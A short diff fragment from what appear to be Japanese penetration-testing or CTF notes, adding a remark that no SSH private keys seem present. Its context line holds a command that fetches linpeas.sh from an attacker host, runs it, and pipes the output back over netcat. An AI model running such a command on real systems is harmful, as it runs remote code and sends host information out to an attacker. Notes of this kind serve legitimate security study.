@@ -117,6 +117,8 @@ curl <AttackerIP>:8888/linpeas.sh | sh | nc -q 0 <AttackerIP> 9002
 
 ## 興味深い情報
 
+- ssh秘密鍵はなさそう
+
 
 ---
 
